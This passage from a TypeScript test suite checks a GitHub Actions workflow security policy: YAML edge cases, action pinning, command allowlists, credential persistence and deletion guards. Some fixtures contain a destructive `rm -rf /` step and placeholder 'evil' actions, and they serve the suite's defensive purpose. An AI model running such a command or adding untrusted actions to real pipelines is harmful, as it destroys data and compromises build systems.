    assert.match(verdict.ok === false ? verdict.reason : "", /own workspace|2 jobs/);
  });

  it("accepts the shipped workflow, which declares one", () => {
    assert.equal(checkWorkflowShape(shipped()).ok, true);
  });
});

/**
 * TASK-017 round-8 review: three more ways the reader saw something the file
 * does not say.
 */
describe("TASK-017 round-8 CRITICAL: the comment boundary and null values", () => {
  /**
   * BOTH OF THESE ARE NOW THE PARSER'S ANSWERS, and both were defects in ours.
   *
   * A quote INSIDE a plain scalar suppresses nothing in YAML, but the hand-
   * written stripper began quoting at any quote anywhere, so `name: foo "bar #
   * baz` kept its comment while YAML reads `foo "bar`. Fixing it broke the
   * shipped workflow once, because a whole-line comment containing a colon had
   * its `#` protected from stripping — the order of two checks inside one
   * function decided whether the file parsed at all.
   *
   * That is the sort of thing that should not be in this repository's care, and
   * it no longer is. The cases stay: they were real, and they now describe the
   * boundary rather than our implementation of it.
   */
  it("ends a plain scalar at its comment even when it contains a quote", () => {
    const parsed = parseWorkflow('name: foo "bar # baz\n');

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), 'foo "bar');
  });

  /** A quoted scalar still keeps a `#` that is inside its quotes. */
  it("keeps a hash inside a quoted scalar", () => {
    const parsed = parseWorkflow('name: "a # b"\n');

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), "a # b");
  });

  /** And the whole-line comment with a colon in it, which broke the build. */
  it("reads a file whose comment contains a colon", () => {
    const parsed = parseWorkflow("# things a local run might have: no external mount\nname: verify\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), "verify");
  });

  /**
   * A KEY WITH NOTHING UNDER IT IS NULL, NOT AN EMPTY MAPPING. `permissions:`
   * followed by a sibling produced `{entries: []}`, and `checkPermissions` then
   * iterated nothing and reported an explicit least-privilege block that is not
   * there — a confident wrong answer, which is the worse failure.
   *
   * Still refused, and now refused as what it is: the normalisation has no null,
   * because inventing one would give every policy a new case to get wrong.
   */
  it("refuses a key declared with no value", () => {
    const parsed = parseWorkflow(
      ["permissions:", "jobs:", "  v:", "    runs-on: ubuntu-latest", ""].join("\n"),
    );

    assert.equal(parsed.ok, false, "a null value was read as an empty mapping");
    assert.match(parsed.ok === false ? parsed.reason : "", /null/);
  });

  /** Including the explicit spellings of null, which are the same thing. */
  for (const spelling of ["permissions: null", "permissions: ~", "permissions: Null"]) {
    it(`refuses ${JSON.stringify(spelling)}`, () => {
      const parsed = parseWorkflow([spelling, "jobs:", "  v:", "    runs-on: ubuntu-latest", ""].join("\n"));

      assert.equal(parsed.ok, false, `${spelling} was read as a mapping`);
      assert.match(parsed.ok === false ? parsed.reason : "", /null/);
    });
  }

  /**
   * AND THE TWO SPELLINGS THAT REACH A DIFFERENT BRANCH, which a mutation
   * caught me not testing.
   *
   * "a key with no value is an empty mapping again" SURVIVED: removing the
   * `pair.value === null` refusal broke nothing. The reason is that the block
   * form above does not produce a JS null at all — the parser gives a
   * `Scalar(null)`, which the non-string-scalar refusal catches — so the branch
   * I had written for missing values was deciding nothing that any case
   * exercised.
   *
   * It is not dead code: FLOW mappings and EXPLICIT KEYS do produce a pair with
   * no value, and those are the spellings below. A guard whose only evidence
   * came from a case that never reached it is the shape this task keeps
   * producing, and the mutation is what found it rather than a reviewer.
   */
  for (const [label, source] of [
    ["a flow mapping entry with no value", "permissions: { contents }\njobs:\n  v: x\n"],
    ["an explicit key with no value", "permissions:\n  ? contents\njobs:\n  v: x\n"],
  ] as const) {
    it(`refuses ${label}`, () => {
      const parsed = parseWorkflow(source);

      assert.equal(parsed.ok, false, `${label} was read as a value`);
      assert.match(parsed.ok === false ? parsed.reason : "", /has no value/);
    });
  }

  it("still parses the shipped workflow, whose keys all have values", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });
});

describe("TASK-017 round-8 HIGH 3: a local action path is not a pinned commit", () => {
  it("refuses a local action path wearing a commit-shaped suffix", () => {
    const local = workflow({ uses: [`./.github/actions/evil@${"a".repeat(40)}`] });

    const verdict = checkActionPins(local);

    assert.equal(verdict.ok, false, "a local action path counted as a pinned commit");
  });

  for (const pin of [
    `../elsewhere/action@${"a".repeat(40)}`,
    `owner/repo/subdir@${"a".repeat(40)}`,
  ]) {
    it(`refuses ${pin}`, () => {
      assert.equal(checkActionPins(workflow({ uses: [pin] })).ok, false);
    });
  }

  it("still accepts the shipped workflow's pins", () => {
    assert.equal(checkActionPins(shipped()).ok, true);
  });
});

describe("TASK-017 round-8 HIGH 4: an empty manifest disables every guard", () => {
  const VERIFIER_TEXT = readFileSync(join(REPO_ROOT, "scripts/verify.mjs"), "utf8");

  /**
   * Commenting every entry out left the verifier's SOURCE TEXT intact, the
   * old tests passing, and the runtime manifest empty. The list now lives in a
   * module both sides import, and an empty one is itself a failure.
   */
  it("refuses an empty manifest while the modules it describes are present", () => {
    assert.match(
      VERIFIER_TEXT,
      /guarded\.length === 0[\s\S]{0,200}?fail\(/,
      "an empty manifest passes, which disables every deletion guard at once",
    );
  });

  /**
   * The manifest DECLARES an anchor and the verifier must USE it. A test that
   * only checks the declaration leaves the usage removable, which is the same
   * shape as a guard nothing can tell from its absence.
   */
  it("acts on the anchor, not merely declares it", () => {
    assert.match(
      VERIFIER_TEXT,
      /anchored && !existsSync\(join\(REPO_ROOT, module\)\)/,
      "the anchor is declared but the verifier does not act on it",
    );
  });

  it("imports the manifest rather than reading its own source", () => {
    assert.match(
      VERIFIER_TEXT,
      /guardedModules\.js/,
      "the verifier does not import the shared manifest, so tests and runtime can disagree",
    );
  });
});


/**
 * TASK-017 parser replacement: structure the parser exposes must not be filtered
 * away.
 *
 * A DEFECT FOUND BY MAKING THE CHANGE, not by a reviewer, and worth recording as
 * such. Moving to a standards parser turned constructs that used to be refused
 * as unreadable into real structure — and three checks were written to take the
 * strings out of a list and ignore whatever else was in it:
 *
 *   checkTriggers      `branches.items.filter(item => typeof item === "string")`
 *   checkActionPins    `steps.map(get "uses").filter(typeof === "string")`
 *   checkRunAllowlist  the same, through `declaredRunCommands`
 *
 * While flow collections were refused at the grammar these filters were
 * unreachable. Afterwards they were live, and the pin check was the worst of
 * them: it treats an empty list as "no actions here, nothing to pin", so a
 * `uses:` that was a sequence rather than a string REMOVED ITSELF from the check
 * and the workflow passed.
 *
 * The lesson is the one the whole task keeps relearning, one layer up from where
 * it was last learned: discarding what you cannot interpret and reporting on the
 * remainder is a misread, not a check. Refuse instead.
 */
describe("TASK-017: a value the policy cannot read is refused, not filtered out", () => {
  const A = "a".repeat(40);

  function parsed(lines: readonly string[]): YamlMap {
    const result = parseWorkflow(lines.join("\n") + "\n");
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  it("refuses a step naming an action as something other than a string", () => {
    const verdict = checkActionPins(
      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: [evil]"]),
    );

    assert.equal(verdict.ok, false, "a non-string `uses` removed itself from the pin check");
    assert.match(verdict.ok === false ? verdict.reason : "", /single string/);
  });

  /**
   * NON-VACUITY FOR THAT REFUSAL: the check must still ACCEPT a pinned action
   * and still REFUSE an unpinned one, or "refuses everything" would pass the
   * case above.
   */
  it("still accepts a pinned action and refuses an unpinned one", () => {
    const base = ["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:"];

    assert.equal(checkActionPins(parsed([...base, `      - uses: actions/checkout@${A}`])).ok, true);
    assert.equal(checkActionPins(parsed([...base, "      - uses: actions/checkout@v4"])).ok, false);
  });

  it("refuses a step whose run: is not a single command", () => {
    const verdict = checkRunAllowlist(
      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", "      - run: [rm, -rf, /]"]),
    );

    assert.equal(verdict.ok, false, "a non-string `run` escaped the command allowlist");
  });

  it("still accepts the allowlisted commands, so that refusal is not universal", () => {
    const verdict = checkRunAllowlist(
      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
              "      - run: npm ci", "      - run: npm test"]),
    );

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /**
   * THE SHAPE GATE REFUSES IT INDEPENDENTLY, because naming a key while
   * ignoring its type is half a shape check — the allowlist said `run` was
   * permitted and never asked what it was.
   */
  it("refuses a non-string step value at the shape gate too", () => {
    const verdict = checkWorkflowShape(
      parsed(["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:",
              '      - "**"', "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest",
              "    steps:", "      - run: [rm, -rf, /]"]),
    );

    assert.equal(verdict.ok, false, "the shape gate allowed a key without checking its type");
    assert.match(verdict.ok === false ? verdict.reason : "", /not a single string/);
  });

  it("refuses an action input that is not a single string", () => {
    const verdict = checkWorkflowShape(
      parsed(["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:",
              '      - "**"', "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest",
              "    steps:", `      - uses: actions/setup-node@${A}`, "        with:",
              // A list of STRINGS: a number would be refused at normalisation
              // instead, and this case is about the shape gate.
              "          node-version: [22.5.0, 18.0.0]"]),
    );

    assert.equal(verdict.ok, false, "a non-string action input was accepted");
  });

  /** And the shape gate still accepts the workflow that ships. */
  it("accepts the shipped workflow", () => {
    const verdict = checkWorkflowShape(shipped());

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });
});

/**
 * TASK-017 round-9 review: four HIGHs, and what they had in common.
 *
 * The round-9 reviewer confirmed every evidence claim — 53/53 mutations killed,
 * 2384/2384 tests, fingerprint identical start and end — and then found four
 * things the harness had never MEASURED. That is the useful shape of a review:
 * not "your evidence is wrong" but "your evidence does not cover this".
 *
 * Three of the four are the same mistake in different places: a check that asked
 * WHICH KEY appeared without asking what it MEANT for that context.
 *
 *   - `types` was allowed for every event, though only `pull_request` has
 *     activity types, because one list served both events.
 *   - a pin proved WHICH VERSION of an action ran and nothing about WHOSE code.
 *   - `name` and the event configs were admitted by name with no type at all.
 *
 * The fourth is different and worse: AC-3 says the clean room inherits "no
 * repository-local git configuration", and nothing checked it. The workflow's
 * own header comment made the same claim. Both were false for eight rounds
 * because a criterion nobody turned into a check reads exactly like one that
 * passes.
 */
describe("TASK-017 round-9 HIGH 1: AC-3's git-configuration clause is checked, not assumed", () => {
  const A = "a".repeat(40);

  function withCheckout(withLines: readonly string[]): YamlMap {
    const result = parseWorkflow([
      "name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"', "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
      `      - uses: actions/checkout@${A}`, ...withLines,
      "      - run: npm ci", "      - run: npm test", "",
    ].join("\n"));
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  it("accepts the shipped workflow, which now sets it explicitly", () => {
    const verdict = checkCheckoutCredentials(shipped());

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /**
   * THE SHIPPED WORKFLOW FAILED THIS UNTIL ROUND 9. The default is `true`, so
   * omitting the input is not neutral — it is the unsafe choice spelled with
   * silence, which is why absence is refused rather than treated as unset.
   */
  it("refuses a checkout that does not mention persist-credentials", () => {
    const verdict = checkCheckoutCredentials(withCheckout([]));

    assert.equal(verdict.ok, false, "an unset persist-credentials was treated as safe");
    assert.match(verdict.ok === false ? verdict.reason : "", /defaults/);
  });

  it("refuses a checkout that persists credentials explicitly", () => {
    const verdict = checkCheckoutCredentials(
      withCheckout(["        with:", '          persist-credentials: "true"']),
    );

    assert.equal(verdict.ok, false, "persist-credentials: true was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /git configuration/);
  });

  /** NON-VACUITY: the value that satisfies it really does satisfy it. */
  it("accepts a checkout that disables credential persistence", () => {
    const verdict = checkCheckoutCredentials(
      withCheckout(["        with:", '          persist-credentials: "false"']),
    );

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /** And the shipped file really contains the line, not merely a passing check. */
  it("ships the input in the file GitHub will read", () => {
    assert.match(SOURCE, /persist-credentials:\s*"false"/);
  });
});

describe("TASK-017 round-9 HIGH 2: trigger configuration is typed, per event", () => {
  function on(lines: readonly string[]): YamlMap {
    const result = parseWorkflow([
      "name: x", "on:", ...lines, "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
      `      - uses: actions/checkout@${"a".repeat(40)}`, "",
    ].join("\n"));
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  /**
   * `pull_request: anything` IS NOT A WORKFLOW GITHUB WOULD RUN, and both the
   * shape gate and `checkTriggers` skipped scalar configs with the same
   * `continue`. Two checks that waive identically are one check.
   *
   * Approving a workflow GitHub rejects is the same failure as approving one
   * that runs wrongly: the evidence AC-5 demands never appears either way.
   */
  it("refuses a scalar event configuration at the shape gate", () => {
    const verdict = checkWorkflowShape(on(["  pull_request: anything", "  push: anything"]));

    assert.equal(verdict.ok, false, "a scalar event config was skipped");
    assert.match(verdict.ok === false ? verdict.reason : "", /rather than a mapping/);
  });

  it("refuses a scalar event configuration at the trigger check too", () => {
    const verdict = checkTriggers(on(["  pull_request: anything", "  push: anything"]));

    assert.equal(verdict.ok, false, "a scalar event config was skipped");
  });

  /**
   * `types` BELONGS TO `pull_request`, NOT TO EVERY EVENT. One shared list was
   * closed over the union of two vocabularies, which is larger than either.
   */
  it("refuses types on push, which GitHub does not give activity types", () => {
    const verdict = checkWorkflowShape(on([
      "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    types:", "      - made-up", "    branches:", '      - "**"',
    ]));

    assert.equal(verdict.ok, false, "types on push was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /not reasoned about for this event/);
  });

  /** NON-VACUITY: types on pull_request, where it is modelled, still passes. */
  it("still accepts types on pull_request", () => {
    const verdict = checkWorkflowShape(on([
      "  pull_request:", "    types:", "      - opened", "      - synchronize",
      "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"',
    ]));

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });
});

describe("TASK-017 round-9 HIGH 3: a mapping key is a node, and gets the same gate", () => {
  /**
   * The anchor/tag/alias checks ran on VALUES only, so `!!str on:` and
   * `&key on:` reached the policy with the tag and anchor silently dropped and
   * every check passed. The normalisation claimed to refuse these and refused
   * them in one of the two positions they can occupy.
   */
  for (const [label, source, reason] of [
    ["a tagged key", "!!str on:\n  push:\n    branches: []\n", /tag/],
    ["an anchored key", "&key on:\n  push:\n    branches: []\n", /anchor/],
    ["an aliased key", "a: &k name\n*k : value\n", /alias|anchor/],
  ] as const) {
    it(`refuses ${label}`, () => {
      const parsed = parseWorkflow(source);

      assert.equal(parsed.ok, false, `${label} was normalised away`);
      assert.match(parsed.ok === false ? parsed.reason : "", reason);
    });
  }

  /** And the reason names the KEY, so a reader is sent to the right place. */
  it("names the key it refused", () => {
    const parsed = parseWorkflow("!!str on:\n  push:\n    branches: []\n");

    assert.match(parsed.ok === false ? parsed.reason : "", /key "on"/);
  });

  /** NON-VACUITY: ordinary keys are still read. */
  it("still reads an ordinary key", () => {
    const parsed = parseWorkflow("name: verify\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), "verify");
  });
});

describe("TASK-017 round-9 HIGH 4: a pin says which version, not whose code", () => {
  const A = "a".repeat(40);

  function steps_(lines: readonly string[]): YamlMap {
    const result = parseWorkflow([
      "name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"', "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", ...lines, "",
    ].join("\n"));
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  /**
   * `checkActionPins` was satisfied completely by `evil/tool@<40 hex>`: the pin
   * was real, the commit was immutable, and the code was somebody else's. Pin
   * and identity are different questions and only one was being asked.
   */
  it("refuses an action nobody has reasoned about, however well pinned", () => {
    const root = steps_([`      - uses: actions/checkout@${A}`, `      - uses: evil/tool@${A}`]);

    assert.equal(checkActionPins(root).ok, true, "the pin itself is valid, which is the point");

    const verdict = checkWorkflowShape(root);

    assert.equal(verdict.ok, false, "an unreasoned-about action was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /evil\/tool/);
  });

  /** NON-VACUITY: the two modelled actions are still admitted. */
  it("still accepts the two actions this repository reasons about", () => {
    const verdict = checkWorkflowShape(steps_([
      `      - uses: actions/checkout@${A}`,
      "        with:", '          persist-credentials: "false"',
      `      - uses: actions/setup-node@${A}`,
      "        with:", '          node-version: "22.5.0"',
    ]));

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /**
   * THE ALLOWLIST AND THE INPUT ALLOWLIST MUST AGREE. An action admitted here
   * with no entry in `ALLOWED_WITH_KEYS` would have its configuration
   * unexamined, which is the gap this pair exists to prevent.
   */
  /**
   * SET EQUALITY, IN BOTH DIRECTIONS (round-10 review, non-blocking note).
   *
   * The first version asserted only that every admitted action had modelled
   * inputs. The reviewer added `"evil/tool": []` to `ALLOWED_WITH_KEYS`, and all
   * 243 cases passed — the invariant is stated as an exact correspondence and
   * half of it was being checked, which is a one-way test wearing the words of
   * a two-way one.
   *
   * Nothing was exploitable: identity is enforced against `ALLOWED_ACTIONS`, so
   * an entry here alone admits nothing. The defect is that the DOCUMENTED
   * invariant was not the TESTED one, which is how the two drift apart.
   */
  it("models the inputs of exactly the actions it admits, and no others", () => {
    assert.deepEqual(
      [...ALLOWED_ACTIONS].sort(),
      Object.keys(ALLOWED_WITH_KEYS).sort(),
      "the identity allowlist and the input allowlist name different sets of actions",
    );
  });

  it("refuses a step declaring both uses: and run:", () => {
    const verdict = checkWorkflowShape(steps_([
      `      - uses: actions/checkout@${A}`,
      "        with:", '          persist-credentials: "false"',
      "      - run: npm test", `        uses: evil/tool@${A}`,
    ]));

    assert.equal(verdict.ok, false, "a step was both an action and a command");
    assert.match(verdict.ok === false ? verdict.reason : "", /both uses: and run:/);
  });

  it("refuses a workflow name that is not a single string", () => {
    const result = parseWorkflow([
      "name: [verify, extra]", "on:", "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"', "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
      `      - uses: actions/checkout@${A}`, "",
    ].join("\n"));
    assert.equal(result.ok, true, result.ok ? "" : result.reason);
    if (!result.ok) return;

    const verdict = checkWorkflowShape(result.root);

    assert.equal(verdict.ok, false, "a sequence name was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /name is not a single string/);
  });
});

/**
 * TASK-017 round-10 review: the trigger guard was closed only by its neighbour.
 *
 * Round 9 found `checkTriggers` skipping scalar event configs. I fixed the
 * scalar case and left `if (config.kind === "map")` with no else, so a SEQUENCE
 * config still fell through to `return ok` — and I never added the per-event key
 * check here at all, so `push: {types: [...]}` was refused by the shape gate and
 * waved through by this one.
 *
 * The lesson is about the shape of the fix, not the gap: a fix written against a
 * reproduction handles the spelling that was reported. Round 9 reported the
 * scalar spelling; the defect was every non-mapping config and every
 * unmodelled key.
 *
 * These cases call `checkTriggers` DIRECTLY. Going through the aggregate would
 * let `checkWorkflowShape` refuse first and prove nothing about this function —
 * the sibling-guard masking that has now occurred seven times in this task, and
 * the precise reason a reviewer could find this while 2,403 tests passed.
 */
describe("TASK-017 round-10 HIGH: the trigger guard is closed independently", () => {
  function on(lines: readonly string[]): YamlMap {
    const result = parseWorkflow([
      "name: x", "on:", ...lines, "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
      `      - uses: actions/checkout@${"a".repeat(40)}`, "",
    ].join("\n"));
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  const VALID_PR = ["  pull_request:", "    branches:", '      - "**"'];

  it("refuses types on push at the trigger check, not only at the shape gate", () => {
    const root = on([...VALID_PR, "  push:", "    types:", "      - pushed", "    branches:", '      - "**"']);

    const verdict = checkTriggers(root);

    assert.equal(verdict.ok, false, "an unmodelled per-event filter passed the trigger check");
    assert.match(verdict.ok === false ? verdict.reason : "", /not a filter this policy reasons about for that event/);
  });

  it("refuses an empty sequence as an event configuration", () => {
    const verdict = checkTriggers(on([...VALID_PR, "  push: []"]));

    assert.equal(verdict.ok, false, "a sequence config fell through to ok");
    assert.match(verdict.ok === false ? verdict.reason : "", /sequence/);
  });

  it("refuses a non-empty sequence as an event configuration", () => {
    const verdict = checkTriggers(on([...VALID_PR, "  push: [anything]"]));

    assert.equal(verdict.ok, false, "a sequence config fell through to ok");
  });

  it("refuses a scalar as an event configuration", () => {
    const verdict = checkTriggers(on([...VALID_PR, "  push: anything"]));

    assert.equal(verdict.ok, false, "a scalar config fell through to ok");
  });

  /**
   * NON-VACUITY, and it matters more than usual here: the four cases above
   * would all pass against a `checkTriggers` that refused everything. These
   * pin the other side.
   */
  it("still accepts the shipped workflow", () => {
    const verdict = checkTriggers(shipped());

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  it("still accepts types on pull_request, where they are modelled", () => {
    const verdict = checkTriggers(on([
      "  pull_request:", "    types:", "      - opened", "      - synchronize",
      "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"',
    ]));

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /**
   * AND THE TWO GATES AGREE. Each must refuse these on its own — that is what
   * "independently closed" means — so the same fixtures are put to both.
   */
  for (const [label, lines] of [
    ["types on push", [...VALID_PR, "  push:", "    types:", "      - pushed", "    branches:", '      - "**"']],
    ["a sequence config", [...VALID_PR, "  push: []"]],
    ["a scalar config", [...VALID_PR, "  push: anything"]],
  ] as const) {
    it(`refuses ${label} at BOTH gates`, () => {
      const root = on(lines);

      assert.equal(checkWorkflowShape(root).ok, false, `${label} passed the shape gate`);
      assert.equal(checkTriggers(root).ok, false, `${label} passed the trigger check`);
    });
  }
});

/**
 * TASK-017 round-12 review: two HIGHs, both about ORDER and ABSENCE rather than
 * about content.
 *
 * The pattern in both: a check that asked whether something EXISTED when the
 * question was WHERE it sat, or whether a guard applied when the thing it
 * guarded had been removed. Neither is detectable by testing well-formed
 * workflows, which is why both survived a green suite.
 */
describe("TASK-017 round-12 HIGH 2: the Node pin must come before anything uses Node", () => {
  const A = "a".repeat(40);

  function fromSteps(stepLines: readonly string[]): YamlMap {
    const result = parseWorkflow([
      "name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
      "  push:", "    branches:", '      - "**"', "permissions:", "  contents: read",
      "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", ...stepLines, "",
    ].join("\n"));
    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
    if (!result.ok) throw new Error("unreachable");
    return result.root;
  }

  const CHECKOUT = [`      - uses: actions/checkout@${A}`, "        with:", '          persist-credentials: "false"'];
  const SETUP = [`      - uses: actions/setup-node@${A}`, "        with:", '          node-version: "22.5.0"'];
  const COMMANDS = ["      - run: npm ci", "      - run: npm test"];

  /**
   * THE REVIEWER'S REPRODUCTION. `npm ci` and `npm test` run on the runner's
   * ambient Node, and `setup-node` then installs the right version for the
   * steps that follow it — of which there are none.
   */
  it("refuses a setup-node placed after the commands", () => {
    const verdict = checkNodePin(fromSteps([...CHECKOUT, ...COMMANDS, ...SETUP]), ">=22.5.0");

    assert.equal(verdict.ok, false, "a pin after the commands counted as pinning them");
    assert.match(verdict.ok === false ? verdict.reason : "", /before actions\/setup-node/);
  });

  it("refuses a setup-node placed between the two commands", () => {
    const verdict = checkNodePin(
      fromSteps([...CHECKOUT, "      - run: npm ci", ...SETUP, "      - run: npm test"]),
      ">=22.5.0",
    );

    assert.equal(verdict.ok, false, "a pin after npm ci counted as pinning it");
  });

  /** NON-VACUITY: the correct order is still accepted, and so is the shipped file. */
  it("accepts a setup-node placed before the commands", () => {
    const verdict = checkNodePin(fromSteps([...CHECKOUT, ...SETUP, ...COMMANDS]), ">=22.5.0");

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  it("accepts the shipped workflow, whose pin comes first", () => {
    const verdict = checkNodePin(shipped(), PACKAGE.engines?.node);

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /** A workflow with no `run:` step at all has nothing to order against. */
  it("does not invent an ordering requirement when nothing runs", () => {
    const verdict = checkNodePin(fromSteps([...CHECKOUT, ...SETUP]), ">=22.5.0");

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });
});

describe("TASK-017 round-12 HIGH 1: deleting the artifact does not delete its guard", () => {
  /**
   * THE WORST FINDING IN THIS TASK SO FAR, and the simplest.
   *
   * `verify.mjs` consulted a manifest entry's anchor only when the ANCHOR FILE
   * still existed, which made the guard conditional on the very thing an
   * attacker removes. Deleting `.github/workflows/verify.yml`, all four
   * verification modules and both test files together left the suite green at
   * 102 test files: the entire deliverable gone, verification reporting
   * success.
   *
   * The requirement is now tied to the DECLARATION. This case asserts the
   * property directly, so it holds without depending on a deletion attack
   * anybody has to remember to run.
   */
  it("requires every anchor the manifest declares to be in the tree", () => {
    const missing = GUARDED_MODULES
      .filter((entry) => entry.anchor !== undefined)
      .filter((entry) => !existsSync(join(REPO_ROOT, entry.anchor!)))
      .map((entry) => entry.anchor);

    assert.deepEqual(missing, [], `the manifest anchors artifacts that are not present: ${missing.join(", ")}`);
  });

  /** And at least one entry IS anchored, or the case above is vacuous. */
  it("anchors the workflow guards to the workflow itself", () => {
    const anchored = GUARDED_MODULES.filter((entry) => entry.anchor === ".github/workflows/verify.yml");

    assert.ok(anchored.length >= 3, `expected the workflow modules to be anchored, found ${anchored.length}`);
  });

  /**
   * AND THE VERIFIER MUST ACT ON A MISSING ANCHOR, not merely declare one.
   * Reading the verifier's source is the same weak evidence that round 8
   * rejected for the manifest, so this asserts the SHAPE of the check rather
   * than its wording: the anchor is consulted before the module's existence is.
   */
  it("makes the verifier refuse a declared anchor that is absent", () => {
    const verifier = readFileSync(join(REPO_ROOT, "scripts/verify.mjs"), "utf8");

    assert.match(
      verifier,
      /anchor !== undefined && !existsSync\(join\(REPO_ROOT, anchor\)\)/,
      "the verifier does not refuse a declared anchor that is missing from the tree",
    );
    /**
     * AND IT MUST FAIL ON THEM. Computing a list and not acting on it is the
     * round-8 defect exactly — a check that quietly does nothing — so the
     * `fail` is asserted alongside the computation rather than inferred from it.
     */
    assert.match(
      verifier,
      /if \(missingAnchors\.length > 0\) \{\s*\n\s*fail\(/,
      "the verifier computes missing anchors without failing on them",
    );
  });
});

/**
 * TASK-017 round-12 note: the runner check was partly self-shaped.
 *
 * The sanity case asserted only that every allowlisted label STARTS WITH
 * `ubuntu-`, which a list containing `ubuntu-latest-8-cores` would also
 * satisfy — and that label is precisely the metered runner AC-1 exists to keep
 * out. A property drawn from the shape of the current values is not the
 * property the criterion is about.
 */
describe("TASK-017 round-12 note: the runner allowlist is stated, not inferred", () => {
  it("is exactly the three runners this repository has reasoned about", () => {
    assert.deepEqual(
      [...FREE_RUNNER_LABELS].sort(),
      ["ubuntu-22.04", "ubuntu-24.04", "ubuntu-latest"],
      "the runner allowlist changed; every entry must be a runner GitHub does not meter for a public repository",
    );
  });

  /** And the metered spellings that look like members are refused. */
  for (const label of ["ubuntu-latest-8-cores", "ubuntu-latest-4-cores", "ubuntu-24.04-arm"]) {
    it(`refuses ${label}, which starts with ubuntu- and is metered`, () => {
      assert.equal(FREE_RUNNER_LABELS.includes(label), false, `${label} is in the allowlist`);
    });
  }
});

/**
 * TASK-017 round-13 review: a CRITICAL and a HIGH, and both are the same shape
 * as findings this task has already had — which is why they are worth naming
 * carefully rather than just fixing.
 *
 * The CRITICAL is the FOURTH iteration of one attack. Each round the deletion
 * guard rested on some other file still being present, and each round the
 * answer was to delete that file too:
 *
 *   round 8   the guard rested on the manifest's ENTRIES        -> comment them out
 *   round 12  it rested on the ANCHOR file                      -> delete the workflow
 *   round 13  it rested on `workflowPolicy.ts`                  -> delete that too
 *
 * A guard predicated on a deletable file can always be switched off by widening
 * the deletion by one. The predicate is now what the repository COMMITS, which
 * a working-tree `rm` cannot change.
 *
 * The HIGH is the "option is not a pin" shape: `version: "1.2"` says which
 * schema to use when the document does not say for itself, and `%YAML 1.1`
 * says for itself.
 */
describe("TASK-017 round-13 HIGH: the YAML version is asserted, not merely requested", () => {
  /**
   * The reviewer's fixture: a 1.1 directive plus the shipped workflow with
   * `on:` quoted. It parsed, normalised, and passed all thirteen checks. The
   * unquoted `on` would have become the boolean `true` and been caught — by
   * accident, which quoting removed.
   */
  it("refuses a document that declares YAML 1.1", () => {
    const candidate = "%YAML 1.1\n---\n" + SOURCE.replace(/^on:/m, '"on":');

    const parsed = parseWorkflow(candidate);

    assert.equal(parsed.ok, false, "a YAML 1.1 document was read with 1.2 assumptions");
    assert.match(parsed.ok === false ? parsed.reason : "", /1\.1|YAML 1\.1|models YAML 1\.2/);
  });

